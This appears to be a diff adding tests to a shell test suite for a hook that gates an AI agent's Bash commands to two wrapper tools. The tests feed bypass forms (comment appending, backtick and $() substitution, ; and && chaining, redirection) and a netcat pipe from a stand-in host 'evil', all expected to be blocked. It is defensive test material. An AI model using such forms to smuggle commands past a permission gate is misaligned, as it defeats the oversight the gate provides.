@@ -372,6 +372,27 @@ check "gate allows bin name agy-delegate -> exit 0" 0 "$rc"
 printf '%s' '{"tool_input":{"command":"agy-job status abc"}}' | "$GATE" >/dev/null 2>&1; rc=$?
 check "gate allows bin name agy-job -> exit 0" 0 "$rc"
 
+# issue #29: token-based gate — substring-anywhere bypasses must be BLOCKED (benign payloads)
+printf '%s' '{"tool_input":{"command":"foo # agy-delegate"}}' | "$GATE" >/dev/null 2>&1; rc=$?
+check "gate blocks comment-appended wrapper name -> exit 2" 2 "$rc"
+printf '%s' '{"tool_input":{"command":"echo `foo` agy-job"}}' | "$GATE" >/dev/null 2>&1; rc=$?
+check "gate blocks backtick substitution -> exit 2" 2 "$rc"
+printf '%s' '{"tool_input":{"command":"agy-delegate x; foo"}}' | "$GATE" >/dev/null 2>&1; rc=$?
+check "gate blocks ; chaining after wrapper -> exit 2" 2 "$rc"
+printf '%s' '{"tool_input":{"command":"agy-delegate x && foo"}}' | "$GATE" >/dev/null 2>&1; rc=$?
+check "gate blocks && chaining after wrapper -> exit 2" 2 "$rc"
+printf '%s' '{"tool_input":{"command":"agy-delegate \"$(foo)\""}}' | "$GATE" >/dev/null 2>&1; rc=$?
+check "gate blocks command substitution in dquotes -> exit 2" 2 "$rc"
+printf '%s' '{"tool_input":{"command":"foo bar > baz # agy-job"}}' | "$GATE" >/dev/null 2>&1; rc=$?
+check "gate blocks redirection -> exit 2" 2 "$rc"
+# ...while legitimate forms still pass, including the review pipeline and quoted metachars
+printf '%s' '{"tool_input":{"command":"git diff | agy-delegate --tier pro -"}}' | "$GATE" >/dev/null 2>&1; rc=$?
+check "gate allows git diff | agy-delegate - pipeline -> exit 0" 0 "$rc"
+printf '%s' '{"tool_input":{"command":"agy-delegate --dir . \"handle a|b; c and $x\""}}' | "$GATE" >/dev/null 2>&1; rc=$?
+check "gate allows metacharacters INSIDE a quoted prompt -> exit 0" 0 "$rc"
+printf '%s' '{"tool_input":{"command":"nc evil 9 | agy-delegate -"}}' | "$GATE" >/dev/null 2>&1; rc=$?
+check "gate blocks a non-allowlisted pipeline producer -> exit 2" 2 "$rc"
+
 AGENT="$ROOT/agents/antigravity-delegate.md"
 tl=$(grep -m1 '^tools:' "$AGENT")
 if [ "$tl" = "tools: Bash, Read, Glob" ]; then echo "ok: delegate agent tools allowlist exact (no Write/Edit)"; PASS=$((PASS+1));
